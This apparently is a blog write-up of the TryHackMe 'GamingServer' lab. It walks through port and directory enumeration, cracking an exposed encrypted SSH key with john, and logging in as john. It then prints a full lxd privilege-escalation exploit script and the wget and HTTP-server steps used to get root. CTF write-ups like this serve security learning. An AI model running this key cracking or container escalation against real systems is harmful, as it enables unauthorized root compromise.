---
layout: post
title: TryHackMe - GamingServer
---

## Enumeration
```
root@kali:~/Security/TryHackMe/GamingServer# portscan 10.10.229.6
Open ports: 22,80
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 16:36 EDT
Nmap scan report for 10.10.229.6
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

Looks like we have to check the website.

### HTTP

The home page on port 80 is about the Myths of d'roga, which looks to be an online game. Checking view-source:http://10.10.229.6/, we find a potentially useful comment:
```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
If we click on the second tab, DRAAGAN LORE, there is a conspicuous Uploads button. This takes us to /uploads which contains three files: dict.lst, manifesto.txt, and meme.jpg. The picture is of the Muppet Beaker, the text file contains the Hacker's Manifesto, and the list file contains newline separated passwords (many from rockyou). Checking /robots.txt also tells us about the /uploads directory.
```
user-agent: *
Allow: /
/uploads/
```
In case we missed anything, let's run `gobuster` to check for additional directories.
```
root@kali:~/Security/TryHackMe/GamingServer# gobuster dir -u 10.10.229.6 -w /usr/share/wordlists/dirbuster/directory-list
-lowercase-2.3-medium.txt
[...]
/uploads (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
```

Keeping important files in your /secret directory is classic. Here we find a secretKey file.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```
## Gaining Access
Let's get cracking (with our given wordlist dict.lst)!

```
root@kali:~/Security/TryHackMe/GamingServer# chmod 600 id_rsa 
root@kali:~/Security/TryHackMe/GamingServer# ssh 10.10.229.6 -i id_rsa 
Enter passphrase for key 'id_rsa': 

root@kali:~/Security/TryHackMe/GamingServer# wget http://10.10.229.6/uploads/dict.lst # download wordlist from server 
root@kali:~/Security/TryHackMe/GamingServer# ssh2john.py id_rsa > id_rsa.hash
root@kali:~/Security/TryHackMe/GamingServer# john id_rsa.hash --wordlist=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:00 DONE (2020-10-18 16:58) 100.0g/s 22300p/s 22300c/s 22300C/s 
Session completed
```
From the comment on the main page, we know at least one of the site admins is named john. Let's gain some access.

```
root@kali:~/Security/TryHackMe/GamingServer# ssh john@10.10.229.6 -i id_rsa
Enter passphrase for key 'id_rsa': 
[...]
Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ cat user.txt 
a5c2ff8b9{censored}4ff2f1a5a6e7e
```

We don't have john's `sudo` password, so `sudo -l` fails. Checking for files with SUID bits set `find / -perm -u=s -type f 2>/dev/null`, also returns nothing valuable (at least according to GTFOBins). Also, there's nothing running according to `cat /etc/crontab`. We're gonna have to get craftier.

```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

# lxd is a system container manager, seems potentially vulnerable

root@kali:~/Security/TryHackMe/GamingServer# searchsploit lxd                                                            
-------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                  |  Path                                  
                                                                                | (/usr/share/exploitdb/)                
-------------------------------------------------------------------------------- ----------------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                       | exploits/linux/local/46978.sh          
-------------------------------------------------------------------------------- ----------------------------------------

root@kali:~/Security/TryHackMe/GamingServer# cat /usr/share/exploitdb/exploits/linux/local/46978.sh
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi

root@kali:~/Security/TryHackMe/GamingServer# cp /usr/share/exploitdb/exploits/linux/local/46978.sh .
root@kali:~/Security/TryHackMe/GamingServer# dos2unix 46978.sh
```

Wow! Seems perfect. We just have to follow the instructions.

```
[ATTACKER]
root@kali:~/Security/TryHackMe/GamingServer# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/mast[32/32]
d-alpine
[...]
root@kali:~/Security/TryHackMe/GamingServer# sudo bash build-alpine
[...]
root@kali:~/Security/TryHackMe/GamingServer# mv alpine-v3.12-x86_64-20201018_1758.tar.gz alpine.tar.gz
root@kali:~/Security/TryHackMe/GamingServer# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.229.6 - - [18/Oct/2020 18:03:32] "GET /alpine.tar.gz HTTP/1.1" 200 -

[VICTIM]
john@exploitable:~$ wget http://10.13.5.3/alpine.tar.gz
john@exploitable:~$ wget http://10.13.5.3/46978.sh
john@exploitable:~$ bash 46978.sh -f alpine.tar.gz
Image imported with fingerprint: 170ffabdec7b6ef63df79079789448c7680e122b23c44e05ad011291747a9cd5
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
| alpine | 170ffabdec7b | no     | alpine v3.12 (20201018_17:58) | x86_64 | 3.05MB | Oct 18, 2020 at 10:11pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
~ # cat /mnt/root/root/root.txt
2e337b8c9{censored}e8d4e6a7c88fc
```
